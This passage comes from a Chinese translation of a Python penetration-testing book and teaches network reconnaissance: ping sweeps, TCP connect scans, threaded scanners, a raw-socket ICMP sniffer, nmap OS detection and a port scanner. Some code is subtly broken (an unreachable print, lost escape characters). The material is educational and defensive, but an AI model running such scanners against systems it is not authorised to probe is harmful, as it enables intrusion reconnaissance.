      if a.startswith(prefix))

proto_fam = get_protnumber('AF_')
types = get_protnumber('SOCK_')
protocols = get_protnumber('IPPROTO_')

for res in socket.getaddrinfo('www.thapar.edu', 'http'):

  family, socktype, proto, canonname, sockaddr = res

  print 'Family        :', proto_fam[family]
  print 'Type          :', types[socktype]
  print 'Protocol      :', protocols[proto]
  print 'Canonical name:', canonname
  print 'Socket address:', sockaddr
```

代码的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/b23fe0ab-be34-4f13-ba4e-06051b364ca5.png)

上部分使用`AF_`、`SOCK_`和`IPPROTO_`前缀创建了一个字典，将协议号映射到它们的名称。这个字典是通过列表推导技术形成的。

代码的上部分有时可能会令人困惑，但我们可以分别执行代码如下：

```py
  >>> dict(( getattr(socket,n),n) for n in dir(socket) if 
  n.startswith('AF_'))
  {0: 'AF_UNSPEC', 2: 'AF_INET', 6: 'AF_IPX', 11: 'AF_SNA', 12:  
  'AF_DECnet', 16: 'AF_APPLETALK', 23: 'AF_INET6', 26: 'AF_IRDA'}
```

现在，这很容易理解。这段代码通常用于获取协议号：

```py
for res in socket.getaddrinfo('www.thapar.edu', 'http'):
```

代码的前一行返回了五个值，如定义中所讨论的。然后将这些值与其相应的字典进行匹配。

# 总结

通过阅读本章，您已经了解了 Python 中的网络。本章的目的是完成即将到来的章节的先决条件。从一开始，您就学会了渗透测试的必要性。渗透测试是为了识别组织中的威胁和漏洞。应该测试什么？这在协议中有规定；不要尝试测试协议中未提及的任何内容。协议是您的免责条款。渗透测试人员应该了解最新的技术，并且在阅读本书之前应该对 Python 有一些了解。为了运行 Python 脚本，您应该有一个实验室设置，一个用于测试实时系统的计算机网络，以及在 Apache 服务器上运行的虚拟网站。

本章还讨论了套接字及其方法。服务器套接字方法定义了如何创建一个简单的服务器。服务器将自己的地址和端口绑定到监听连接。知道服务器地址和端口号的客户端连接到服务器以获取服务。一些套接字方法，如`socket.recv(bufsize)`、`socket.recvfrom(bufsize)`、`socket.recv_into(buffer)`、`socket.send(bytes)`等对服务器和客户端都很有用。您学会了如何处理不同类型的异常。在*有用的套接字方法*部分，您了解了如何获取机器的 IP 地址和主机名，如何从域名中获取 IP 地址，反之亦然。

在下一章中，我们将研究扫描渗透测试，其中包括 IP 地址扫描以检测活动主机。进行 IP 扫描时，使用 ping 扫描和 TCP 扫描。您将学习如何使用端口扫描器检测远程主机上运行的服务。


# 第二章：扫描渗透测试

网络扫描是指一组程序，用于调查活动主机、主机类型、开放端口和主机上运行的服务类型。网络扫描是情报收集的一部分，攻击者可以通过它创建目标组织的概况。

在本章中，我们将涵盖以下主题：

+   如何检查活动系统

+   Ping 扫描

+   TCP 扫描程序

+   如何创建一个高效的 IP 扫描程序

+   运行在目标机器上的服务

+   端口扫描的概念

+   如何创建一个高效的端口扫描程序

您应该对 TCP/IP 层通信有基本的了解。在进一步进行之前，应清楚**协议数据单元**（**PDU**）的概念。

PDU 是协议中指定的数据单元。这是每一层的数据的通用术语：

+   对于应用层，PDU 表示数据

+   对于传输层，PDU 表示一个段

+   对于互联网或网络层，PDU 表示一个数据包

+   对于数据链路层或网络访问层，PDU 表示帧

+   对于物理层，即物理传输，PDU 表示位

# 如何检查网络中的活动系统以及活动系统的概念

Ping 扫描涉及向主机发送**ICMP ECHO 请求**。如果主机活动，它将返回**ICMP ECHO 回复**，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/1d0e92cb-1eae-4d31-bf75-948ace2b3865.png)

ICMP 请求和回复

操作系统的`ping`命令提供了检查主机是否活动的功能。考虑一种情况，您必须测试完整的 IP 地址列表。在这种情况下，如果您逐个测试 IP 地址，将需要大量的时间和精力。为了处理这种情况，我们使用 ping 扫描。

# Ping 扫描

Ping 扫描用于通过发送 ICMP ECHO 请求和 ICMP ECHO 回复从一系列 IP 地址中识别活动主机。从子网和网络地址，攻击者或渗透测试人员可以计算网络范围。在本节中，我将演示如何利用操作系统的 ping 功能。

首先，我将编写一个简单而小的代码片段，如下所示：

```py
import os
response = os.popen('ping -n 1 10.0.0.1')
for line in response.readlines():
    print line,
```

在前面的代码中，`import os`导入 OS 模块，以便我们可以在 OS 命令上运行。下一行，`os.popen('ping -n 1 10.0.0.1')`，将 DOS 命令作为字符串传递，并返回与命令的标准输入或输出流连接的类似文件的对象。 “ping -n 1 10.0.0.1”命令是 Windows OS 命令，发送一个 ICMP ECHO 请求数据包。通过阅读“os.psopen（）”函数，您可以拦截命令的输出。输出存储在`response`变量中。在下一行中，使用“readlines（）”函数来读取类似文件对象的输出。

程序的输出如下：

```py
  G:Project SnakeChapter 2ip>ips.py
  Pinging 10.0.0.1 with 32 bytes of data:
  Reply from 10.0.0.1: bytes=32 time=3ms TTL=64
  Ping statistics for 10.0.0.1:
      Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
  Approximate round trip times in milli-seconds:
      Minimum = 3ms, Maximum = 3ms, Average = 3ms
```

输出显示“回复”，“字节”，“时间”和`TTL`值，表示主机是活动的。考虑程序对 IP`10.0.0.2`的另一个输出：

```py
  G:Project SnakeChapter 2ip>ips.py
  Pinging 10.0.0.2 with 32 bytes of data:
  Reply from 10.0.0.16: Destination host unreachable.
  Ping statistics for 10.0.0.2:
      Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
```

前面的输出显示主机未活动。

前面的代码对于正确的功能非常重要，类似于汽车的引擎。为了使其完全功能，我们需要修改代码，使其与平台无关，并产生易于阅读的输出。

我希望我的代码适用于一系列 IP 地址：

```py
import os
net = raw_input("Enter the Network Address ")
net1= net.split('.')
print net1
a = '.'
net2 = net1[0]+a+net1[1]+a+net1[2]+a
print net2
st1 = int(raw_input("Enter the Starting Number "))
en1 = int(raw_input("Enter the Last Number "))
```

前面的代码要求子网的网络地址，但您可以提供子网的任何 IP 地址。下一行，`net1= net.split('.')`，将 IP 地址分成四部分。`net2 = net1[0]+a+net1[1]+a+net1[2]+a`语句形成网络地址。最后两行要求一系列 IP 地址。

要使其与平台无关，请使用以下代码：

```py
import os
import platform
oper = platform.system()
if (oper=="Windows"):
  ping1 = "ping -n 1 "
elif (oper== "Linux"):
  ping1 = "ping -c 1 "
else :
  ping1 = "ping -c 1 "  
```

前面的代码确定了代码是在 Windows 操作系统上运行还是在 Linux 平台上。`oper = platform.system()`语句将此通知给正在运行的操作系统，因为 Windows 和 Linux 中的`ping`命令不同。Windows 操作系统使用`ping -n 1`发送一个 ICMP ECHO 请求数据包，而 Linux 使用`ping -c 1`。

现在，让我们看看完整的代码如下：

```py
import os
import platform
from datetime import datetime
net = raw_input("Enter the Network Address ")
net1= net.split('.')
a = '.'
net2 = net1[0]+a+net1[1]+a+net1[2]+a
st1 = int(raw_input("Enter the Starting Number "))
en1 = int(raw_input("Enter the Last Number "))
en1=en1+1
oper = platform.system()

if (oper=="Windows"):
  ping1 = "ping -n 1 "
elif (oper== "Linux"):
  ping1 = "ping -c 1 "
else :
  ping1 = "ping -c 1 "
t1= datetime.now()
print "Scanning in Progress"
for ip in xrange(st1,en1):
  addr = net2+str(ip)
  comm = ping1+addr
  response = os.popen(comm)
  for line in response.readlines():
    if 'ttl' in line.lower():
      break
    if 'ttl' in line.lower():
      print addr, "--> Live"

t2= datetime.now()
total =t2-t1
print "scanning complete in " , total
```

在前面的代码中有一些新的东西。`for ip in xrange(st1,en1):`语句提供数字值，即 IP 地址的最后一个八位值。在`for`循环内，`addr = net2+str(ip)`语句使其成为一个完整的 IP 地址，`comm = ping1+addr`语句使其成为一个完整的操作系统命令，传递给`os.popen(comm)`。`if(line.count("TTL")):`语句检查行中是否出现`TTL`。如果在行中找到任何`TTL`值，则使用`break`语句中断行的进一步处理。代码的下两行打印出找到`TTL`的 IP 地址。我使用`datetime.now()`来计算扫描所花费的总时间。

`ping_sweep.py`程序的输出如下：

```py
  G:Project SnakeChapter 2ip>python ping_sweep.py
  Enter the Network Address 10.0.0.1
  Enter the Starting Number 1
  Enter the Last Number 60
  Scanning in Progress
  10.0.0.1 --> Live
  10.0.0.2 --> Live
  10.0.0.5 --> Live
  10.0.0.6 --> Live
  10.0.0.7 --> Live
  10.0.0.8 --> Live
  10.0.0.9 --> Live
  10.0.0.10 --> Live
  10.0.0.11 --> Live
  scanning complete in  0:02:35.230000
```

要扫描 60 个 IP 地址，程序花费了 2 分钟 35 秒。

# TCP 扫描概念及其使用 Python 脚本的实现

Ping 扫描基于 ICMP ECHO 请求和 ICMP ECHO 回复。许多用户关闭了 ICMP ECHO 回复功能或使用防火墙阻止 ICMP 数据包。在这种情况下，您的 ping 扫描器可能无法工作。在这种情况下，您需要进行 TCP 扫描。我希望您熟悉三次握手，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/5142a124-0157-4391-b994-3b2bbf01b9ac.png)

为了建立连接，主机执行三次握手。建立 TCP 连接的三个步骤如下：

1.  客户端发送了一个带有**SYN**标志的段; 这意味着客户端请求服务器开始一个会话

1.  服务器以包含**ACK**和**SYN**标志的段的形式发送回复

1.  客户端以**ACK**标志响应

现在，让我们看看以下 TCP 扫描的代码：

```py
import socket 
from datetime import datetime
net= raw_input("Enter the IP address ")
net1= net.split('.')
a = '.'
net2 = net1[0]+a+net1[1]+a+net1[2]+a
st1 = int(raw_input("Enter the Starting Number "))
en1 = int(raw_input("Enter the Last Number "))
en1=en1+1
t1= datetime.now()
def scan(addr):
  sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  socket.setdefaulttimeout(1)
  result = sock.connect_ex((addr,135))
  if result==0:
    return 1
  else :
    return 0

def run1():
  for ip in xrange(st1,en1):
    addr = net2+str(ip)
    if (scan(addr)):
      print addr , "is live"

run1()
t2= datetime.now()
total =t2-t1
print "scanning complete in " , total
```

前面代码的上半部分与先前的代码相同。在这里，我们使用了两个函数。首先，`scan(addr)`函数使用套接字，如第一章中所讨论的，*Python 与渗透测试和网络*。`result = sock.connect_ex((addr,135))`语句返回一个错误指示器。如果操作成功，则错误指示器为`0`，否则为`errno`变量的值。在这里，我们使用端口`135`；这个扫描器适用于 Windows 系统。有一些端口，如`137`，`138`，`139`（NetBIOS 名称服务）和`445`（Microsoft-DSActive Directory）通常是开放的。因此，为了获得更好的结果，您必须更改端口并重复扫描。

`iptcpscan.py`程序的输出如下：

```py
  G:Project SnakeChapter 2ip>python iptcpscan.py
  Enter the IP address 10.0.0.1
  Enter the Starting Number 1
  Enter the Last Number 60
  10.0.0.8 is live
  10.0.0.11 is live
  10.0.0.12 is live
  10.0.0.15 is live
  scanning complete in  0:00:57.415000
  G:Project SnakeChapter 2ip>
```

让我们更改端口号。使用`137`，您将看到以下输出：

```py
  G:Project SnakeChapter 2ip>python iptcpscan.py
  Enter the IP address 10.0.0.1
  Enter the Starting Number 1
  Enter the Last Number 60
  scanning complete in  0:01:00.027000
  G:Project SnakeChapter 2ip>
```

该端口号将没有任何结果。再次更改端口号。使用`445`，输出将如下所示：

```py
  G:Project SnakeChapter 2ip>python iptcpscan.py
  Enter the IP address 10.0.0.1
  Enter the Starting Number 1
  Enter the Last Number 60
  10.0.0.5 is live
  10.0.0.13 is live
  scanning complete in  0:00:58.369000
  G:Project SnakeChapter 2ip>
```

前面三个输出显示`10.0.0.5`，`10.0.0.8`，`10.0.0.11`，`10.0.0.12`，`10.0.0.13`和`10.0.0.15`是活动的。这些 IP 地址正在运行 Windows 操作系统。这是一个让您检查 Linux 的常见开放端口并使 IP 成为完整 IP TCP 扫描器的练习。

# 如何在 Windows 中创建一个高效的 IP 扫描器

到目前为止，您已经看到了 ping 扫描仪和 IP TCP 扫描仪。想象一下，您购买了一辆拥有所有必要设施的汽车，但速度非常慢；您觉得这是浪费时间和金钱。当我们的程序执行非常缓慢时，情况也是如此。对于`ping_sweep.py`程序扫描 60 个主机，对于 TCP 扫描仪几乎花费了一分钟的相同 IP 地址范围，花费了 2 分钟 35 秒。这需要很长时间才能产生结果。但不用担心。Python 为您提供了多线程，这将使您的程序更快。

我已经写了一个关于多线程 ping 扫描的完整程序，并将在本节中向您解释：

```py
import os
import collections
import platform
import socket, subprocess,sys
import threading
from datetime import datetime
''' section 1 '''

net = raw_input("Enter the Network Address ")
net1= net.split('.')
a = '.'
net2 = net1[0]+a+net1[1]+a+net1[2]+a
st1 = int(raw_input("Enter the Starting Number "))
en1 = int(raw_input("Enter the Last Number "))
en1 =en1+1
dic = collections.OrderedDict()
oper = platform.system()

if (oper=="Windows"):
  ping1 = "ping -n 1 "
elif (oper== "Linux"):
  ping1 = "ping -c 1 "
else :
  ping1 = "ping -c 1 "
t1= datetime.now()
'''section 2'''
class myThread (threading.Thread):
  def __init__(self,st,en):
    threading.Thread.__init__(self)
    self.st = st
    self.en = en
  def run(self):
    run1(self.st,self.en)
'''section 3'''         
def run1(st1,en1):
  #print "Scanning in Progess"
  for ip in xrange(st1,en1):
    #print ".",
    addr = net2+str(ip)
    comm = ping1+addr
    response = os.popen(comm)
    for line in response.readlines():
      if(line.count("TTL")):
        break
    if (line.count("TTL")):
      #print addr, "--> Live"
      dic[ip]= addr
''' Section 4  '''
total_ip =en1-st1
tn =20  # number of ip handled by one thread
total_thread = total_ip/tn
total_thread=total_thread+1
threads= []
try:
  for i in xrange(total_thread):
    en = st1+tn
    if(en >en1):
      en =en1
    thread = myThread(st1,en)
    thread.start()
    threads.append(thread)
    st1 =en
except:
  print "Error: unable to start thread"
print "t
Number of Threads active:", threading.activeCount()

for t in threads:
  t.join()
print "Exiting Main Thread"
dict = collections.OrderedDict(sorted(dic.items()))
for key in dict:
  print dict[key],"-->" "Live"
t2= datetime.now()
total =t2-t1
print "scanning complete in " , total
```

“第 1 节”部分与上一个程序相同。这里添加的一件事是有序字典，因为它记住了其内容添加的顺序。如果想知道哪个线程首先输出，那么有序字典适合这里。 “第 2 节”部分包含线程类，`class myThread (threading.Thread):`语句初始化线程类。`self.st = st`和`self.en = en`语句获取 IP 地址的起始和结束范围。 “第 3 节”部分包含`run1`函数的定义，它是汽车的引擎，并由每个具有不同 IP 地址范围的线程调用。`dic[ip]= addr`语句将主机 ID 存储为有序字典中的键，并将 IP 地址存储为值。 “第 4 节”语句在此代码中是全新的；`total_ip`变量是要扫描的 IP 地址总数。

`tn =20`变量的重要性在于它表示一个线程将扫描 20 个 IP 地址。`total_thread`变量包含需要扫描`total_ip`的总线程数，它表示 IP 地址的数量。`threads= []`语句创建一个将存储线程的空列表。`for`循环，`for i in xrange(total_thread):`，产生线程：

```py
en = st1+tn
  if(en >en1):
    en =en1
  thread = myThread(st1,en)
  thread.start()
  st1 =en
```

前面的代码生成了 20-20 个 IP 地址的范围，例如`st1-20, 20-40 ......-en1`。`thread = myThread(st1,en)`语句是线程类的线程对象：

```py
for t in threads:
  t.join()
```

前面的代码终止了所有线程。接下来的一行，`dict = collections.OrderedDict(sorted(dic.items()))`，创建了一个新的排序字典`dict`，其中按顺序包含 IP 地址。接下来的行按顺序打印活动 IP。`threading.activeCount()`语句显示了产生了多少个线程。一图胜千言。以下图表也是如此：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/245d5e07-b312-4e07-815f-226ba9ef1023.png)

创建和处理线程

`ping_sweep_th_.py`程序的输出如下：

```py
  G:Project SnakeChapter 2ip>python ping_sweep_th.py
  Enter the Network Address 10.0.0.1
  Enter the Starting Number 1
  Enter the Last Number 60
          Number of Threads active: 4
  Exiting Main Thread
  10.0.0.1 -->Live
  10.0.0.2 -->Live
  10.0.0.5 -->Live
  10.0.0.6 -->Live
  10.0.0.10 -->Live
  10.0.0.13 -->Live
  scanning complete in  0:01:11.817000
```

扫描已在一分 11 秒内完成。作为练习，更改`tn`变量的值，将其从`2`设置为`30`，然后研究结果并找出`tn`的最合适和最佳值。

到目前为止，您已经看到了多线程的 ping 扫描；现在，我编写了一个使用 TCP 扫描方法的多线程程序：

```py
import threading
import time
import socket, subprocess,sys
import thread
import collections
from datetime import datetime
'''section 1''' 
net = raw_input("Enter the Network Address ")
st1 = int(raw_input("Enter the starting Number  "))
en1 = int(raw_input("Enter the last Number "))
en1=en1+1
dic = collections.OrderedDict()
net1= net.split('.')
a = '.'
net2 = net1[0]+a+net1[1]+a+net1[2]+a
t1= datetime.now()
'''section 2'''
class myThread (threading.Thread):
  def __init__(self,st,en):
    threading.Thread.__init__(self)
    self.st = st
    self.en = en
  def run(self):
    run1(self.st,self.en)

'''section 3'''
def scan(addr):
  sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  socket.setdefaulttimeout(1)
  result = sock.connect_ex((addr,135))
  if result==0:
    sock.close()
    return 1
  else :
    sock.close()

def run1(st1,en1):
  for ip in xrange(st1,en1):
    addr = net2+str(ip)
    if scan(addr):
      dic[ip]= addr
'''section 4'''
total_ip =en1-st1
tn =20  # number of ip handled by one thread
total_thread = total_ip/tn
total_thread=total_thread+1
threads= []
try:
  for i in xrange(total_thread):
    #print "i is ",i
    en = st1+tn
    if(en >en1):
      en =en1
    thread = myThread(st1,en)
    thread.start()
    threads.append(thread)
    st1 =en
except:
  print "Error: unable to start thread"
print "t Number of Threads active:", threading.activeCount()
for t in threads:
  t.join()
print "Exiting Main Thread"
dict = collections.OrderedDict(sorted(dic.items()))
for key in dict:
  print dict[key],"-->" "Live"
t2= datetime.now()
total =t2-t1
print "scanning complete in " , total
```

理解该程序不应该有困难。以下图表显示了所有内容：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/e11fcf5c-49fc-400b-88d8-956710f96afb.png)

IP TCP 扫描仪

该类以范围作为输入并调用`run1()`函数。 “第 4 节”部分创建一个线程，它是类的实例，获取一个短范围，并调用`run1()`函数。`run1()`函数具有一个 IP 地址，获取来自线程的范围，并生成输出。

`iptcpscan.py`程序的输出如下：

```py
  G:Project SnakeChapter 2ip>python iptcpscan_t.py
  Enter the Network Address 10.0.0.1
  Enter the starting Number  1
  Enter the last Number 60
          Number of Threads active: 4
  Exiting Main Thread
  10.0.0.5 -->Live
  10.0.0.13 -->Live
  scanning complete in  0:00:20.018000
```

20 秒内扫描 60 个 IP 地址；性能还不错。作为练习，将两个扫描仪合并成一个扫描仪。

# 如何在 Linux 中创建高效的 IP 扫描仪

之前的 IP 扫描器可以在 Windows 和 Linux 上运行。现在，我要解释一个超级快的 IP 扫描器，但它只能在 Linux 机器上运行。在前面的代码中，我们使用了 ping 实用程序，但现在我们将使用我们自己的 ping 数据包来进行 ping。

# 基于 Linux 的 IP 扫描器的概念

IP 扫描器背后的概念非常简单。我们将产生多个线程，向不同的 IP 地址发送 ping 数据包。一个守护线程将负责捕获这些 ping 数据包的响应。要运行 IP 扫描器，您需要安装 ping 模块。您可以从这里下载 ping 模块的`.zip`文件：[`pypi.python.org/pypi/ping`](https://pypi.python.org/pypi/ping)。只需解压缩或解压 tar，浏览文件夹，并运行以下命令：

```py
python setup.py install
```

如果您不想安装模块，那么只需从解压后的文件夹中复制`ping.py`文件，并将其粘贴到您将要运行 IP 扫描器代码的文件夹中。

让我们看看`ping_sweep_send_rec.py`的代码：

```py
import socket
from datetime import datetime
import ping
import struct
import binascii
from threading import Thread
import time

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))

net = raw_input("Enter the Network Address ")
net1= net.rsplit('.',1)
net2 = net1[0]+'.'
start1 = int(raw_input("Enter the Starting Number "))
end1 = int(raw_input("Enter the Last Number "))
end1 =end1+1

seq_ip = []
total_ip =end1-start1
tn =10 # number of ip handled by one thread
total_thread = total_ip/tn
total_thread=total_thread+1
threads= []
t1= datetime.now()

def send_ping(st1,en1):
  for each in xrange(st1,en1):
    try:
      ip = net2+str(each)
      ping.do_one(ip,1,32)
    except Exception as e :
      print "Error in send_ping", e

def icmp_sniff():
  s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)

  while True:
    pkt = s.recvfrom(2048)
    num = pkt[0][14].encode('hex')
    ip_length = (int(num) % 10) * 4
    ipheader = pkt[0][14:14+ip_length]
    icmp_h =pkt[0][14+ip_length]
    ip_hdr = struct.unpack("!8sBB2s4s4s",ipheader[:20])
    icmp_hdr = struct.unpack("!B",icmp_h)
    if(ip_hdr[2]==1) and (icmp_hdr[0]==0):
      ip = socket.inet_ntoa(ip_hdr[4])
      ip1= ip.rsplit('.',1)
      list_temp = [ip1[1].zfill(3),ip]
      seq_ip.append(list_temp)

scan_thread = Thread(target=icmp_sniff)
scan_thread.setDaemon(True)
scan_thread.start()
st1 = start1

try:
    for i in xrange(total_thread):
    en = st1+tn
    if(en >end1):
      en =end1
    ping_thread = Thread(target=send_ping,args=(st1,en,) )
    ping_thread.start()
    threads.append(ping_thread)
    st1 =en

except Exception as e :
     print "Error in Thread", e

for t in threads:
    t.join()
time.sleep(1)
seq_ip.sort(key=lambda x: int(x[0]))
print "S.no\t","IP"
for each in seq_ip:
  print each[0]," ", each[1]

t2= datetime.now()
print "Time taken ", t2-t1
```

在前面的代码中，IP 计算和线程创建部分与我们之前看到的代码块非常相似。`send_ping`函数由线程调用，以便使用 ping 模块发送 ping 数据包。在语法`ping.do_one(ip,1,32)`中，第二个和第三个参数分别表示超时和数据包大小。因此，我将`1`设置为超时，`32`设置为 ping 数据包大小。`icmp_sniff`中的代码可能对您来说是新的。您将在第三章中学习所有语法的详细信息，即*嗅探和渗透测试*。简而言之，`icmp_sniff`函数正在从传入的 ICMP 回复数据包中捕获发送者的 IP 地址。正如我们已经知道的那样，ICMP 回复数据包的代码是`0`。语法`if(ip_hdr[2]==1)`和`(icmp_hdr[0]==0)`表示我们只想要 ICMP 和 ICMP 回复数据包。

让我们运行代码并查看输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/193489c2-4647-48e1-9405-0d61e37d3c6a.jpg)

前面的输出显示，程序只需要大约 11 秒就可以对 254 个主机进行扫描。在前面的代码中，我们设置了每个线程 10 个 IP 地址。您可以更改每个线程的 IP 地址。尝试不同的值并优化每个线程的 IP 值。

# 使用 Python 的 nmap

这一部分专门为 nmap 爱好者准备。您可以在 Python 中使用`nmap`。您只需要安装`python-nmap`模块和`nmap`。安装它们的命令非常简单。通过使用 pip，我们可以安装`python-nmap`：

```py
pip install python-nmap
```

安装`python-nmap`模块后，您可以通过导入来检查`nmap`模块。如果导入时没有错误，那么这意味着它已成功安装。让我们看看`nmap`里面有什么：

```py
>>>import nmap
>>> dir(nmap)
['ET', 'PortScanner', 'PortScannerAsync', 'PortScannerError', 'PortScannerHostDict', 'PortScannerYield', 'Process', '__author__', '__builtins__', '__doc__', '__file__', '__last_modification__', '__name__', '__package__', '__path__', '__version__', 'convert_nmap_output_to_encoding', 'csv', 'io', 'nmap', 'os', 're', 'shlex', 'subprocess', 'sys']
```

我们将使用`PortScanner`类来实现这一点。让我们看看代码，然后运行它：

```py
import nmap, sys
syntax="OS_detection.py <hostname/IP address>"
if len(sys.argv) == 1:
 print (syntax)
 sys.exit()
host = sys.argv[1]
nm=nmap.PortScanner()
open_ports_dict = nm.scan(host, arguments="-O").get("scan").get(host).get("tcp")
print "Open ports ", " Description"
port_list = open_ports_dict.keys()
port_list.sort()
for port in port_list:
 print port, "---\t-->",open_ports_dict.get(port)['name']
print "\n--------------OS detail---------------------\n"
print "Details about the scanned host are: \t", nm[host]['osmatch'][0]['osclass'][0]['cpe']
print "Operating system family is: \t\t", nm[host]['osmatch'][0]['osclass'][0]['osfamily']
print "Type of OS is: \t\t\t\t", nm[host]['osmatch'][0]['osclass'][0]['type']
print "Generation of Operating System :\t", nm[host]['osmatch'][0]['osclass'][0]['osgen']
print "Operating System Vendor is:\t\t", nm[host]['osmatch'][0]['osclass'][0]['vendor']
print "Accuracy of detection is:\t\t", nm[host]['osmatch'][0]['osclass'][0]['accuracy']
```

前面的代码非常简单：只需创建一个`nm=nmap.PortScanner()`对象。当您调用`nm.scan(host, arguments="-O")`方法时，您将获得一个非常复杂的字典。以下输出是字典的一部分：

```py
 'scan': {'192.168.0.1': {'status': {'state': 'up', 'reason': 'localhost-response'}, 'uptime': {'seconds': '7191', 'lastboot': 'Mon Mar 19 20:43:41 2018'}, 'vendor': {}, 'addresses': {'ipv4': '192.168.0.1'}, 'tcp': {902: {'product': '', 'state': 'open', 'version': '', 'name': 'iss-realsecure', 'conf': '3', 'extrainfo': '', 'reason': 'syn-ack', 'cpe': ''}, 135: {'product': '', 'state': 'open', 'version': '', 'name': 'msrpc', 'conf': '3', 'extrainfo': '', 'reason': 'syn-ack', 'cpe': ''}, 139: {'product': '', 'state': 'open', 'version': '', 'name': 'netbios-ssn', 'conf': '3', 'extrainfo': '', 'reason': 'syn-ack', 'cpe': ''}, 5357: {'product': '', 'state': 'open', 'version': '', 'name': 'wsdapi', 'conf': '3', 'extrainfo': '', 'reason': 'syn-ack', 'cpe': ''}, 912: {'product': '', 'state': 'open', 'version': '', 'name': 'apex-mesh', 'conf': '3', 'extrainfo': '', 'reason': 'syn-ack', 'cpe': ''}, 445: {'product': '', 'state': 'open', 'version': '', 'name': 'microsoft-ds', 'conf': '3', 'extrainfo': '', 'reason': 'syn-ack', 'cpe': ''}}, 'hostnames': [{'type': '', 'name': ''}], 'osmatch': [{'osclass': [{'osfamily': 'Windows', 'vendor': 'Microsoft', 'cpe': ['cpe:/o:microsoft:windows_10'], 'type': 'general purpose', 'osgen': '10', 'accuracy': '100'}], 'line': '65478', 'name': 'Microsoft Windows 10 10586 - 14393', 'accuracy': '100'}], 'portused': [{'state': 'open', 'portid': '135', 'proto': 'tcp'}, {'state': 'closed', 'portid': '1', 'proto': 'tcp'}, {'state': 'closed', 'portid': '34487', 'proto': 'udp'}]}}}
```

从前面的代码中，很容易获得所需的信息；但需要基本的 Python 知识。让我们在四种不同的操作系统上运行代码。首先，我在 Redhat Linux 5.3 和 Debian 7 上运行了代码。您可以在以下输出中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/cec170e7-9c22-4116-9344-6e94dd715f59.png)

从前面的输出中，您可以看到`nmap`成功找到了开放的 TCP 端口和所需的操作系统详细信息。

让我们在 Windows 操作系统上运行`nmap`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/78ab4f7b-e470-44fa-a884-32d03897291f.jpg)

在前面的输出中，`nmap`成功找到了 Windows XP 和 Windows 10。`nmap`模块中还有许多其他功能。您可以自行探索这些功能并编写适当的代码。

# 目标机器上运行哪些服务？

现在，您已经熟悉了如何扫描 IP 地址并在子网中识别活动主机。在本节中，我们将讨论运行在主机上的服务。这些服务是使用网络连接的服务。使用网络连接的服务必须打开一个端口；从端口号，我们可以识别在目标机器上运行的服务。在渗透测试中，端口扫描的重要性在于检查主机上是否运行了非法服务。

考虑这样一种情况，用户通常使用他们的计算机下载游戏，在游戏安装过程中发现了特洛伊木马。特洛伊木马进入隐藏模式；打开一个端口；将所有按键，包括日志信息，发送给黑客。在这种情况下，端口扫描有助于识别在受害者计算机上运行的未知服务。

端口号范围从`0`到`65535`。众所周知的端口（也称为系统端口）是从`0`到`1023`的端口，保留用于特权服务。从`1024`到`49151`的端口是用于应用程序的注册端口，例如，端口`3306`保留用于 MySQL。

# 端口扫描器的概念

TCP 的三次握手作为端口扫描器的逻辑；在 TCP/IP 扫描器中，您已经看到端口（`137`或`135`）是 IP 地址范围中的一个。但是，在端口扫描器中，IP 只是一个范围内的一个端口。取一个 IP 并尝试连接用户给定的范围内的每个端口。如果连接成功，端口打开；否则，端口保持关闭。

我已经为端口扫描编写了一些非常简单的代码：

```py
import socket, subprocess,sys
from datetime import datetime

subprocess.call('clear',shell=True)
rmip = raw_input("t Enter the remote host IP to scan:")
r1 = int(raw_input("t Enter the start port numbert"))
r2 = int (raw_input("t Enter the last port numbert"))
print "*"*40
print "n Mohit's Scanner is working on ",rmip
print "*"*40

t1= datetime.now()
try:
  for port in range(r1,r2):
    sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)

    result = sock.connect_ex((rmip,port))
    if result==0:
      print "Port Open:-->t", port
      # print desc[port]
    sock.close()

except KeyboardInterrupt:
  print "You stop this "
  sys.exit()

except Exception as e :
  print e
  sys.exit()

t2= datetime.now()

total =t2-t1
print "scanning complete in " , total
```

主要逻辑已经写在`try`块中，表示汽车的引擎。您熟悉语法。让我们对输出进行研究和开发。

`portsc.py`程序的输出如下：

```py
  root@Mohit|Raj:/port#python portsc.py 
         Enter the remote host IP to scan:192.168.0.3
         Enter the start port number    1
         Enter the last port number     4000
  ****************************************
   Mohit's Scanner is working on  192.168.0.3
  ****************************************
  Port Open:-->      22
  Port Open:-->      80
  Port Open:-->      111
  Port Open:-->      443
  Port Open:-->      924
  Port Open:-->      3306
  scanning complete in  0:00:00.766535
```

前面的输出显示，端口扫描器在`0.7`秒内扫描了 1,000 个端口；连接是完整的，因为目标机器和扫描器机器在同一个子网上。

让我们讨论另一个输出：

```py
    Enter the remote host IP to scan:10.0.0.1
    Enter the start port number 1
    Enter the last port number  4000
  ****************************************
  Mohit's Scanner is working on  10.0.0.1
  ****************************************
  Port Open:-->  23
  Port Open:-->  53
  Port Open:-->  80
  Port Open:-->  1780
  scanning complete in  1:06:43.272751
```

现在，让我们分析一下输出：扫描 4,000 个端口，扫描器花费了`1:06:43.272751`小时。这花了很长时间。拓扑结构是：

`192.168.0.10 --> 192.168.0.1 --> 10.0.0.16 ---> 10.0.0.1`

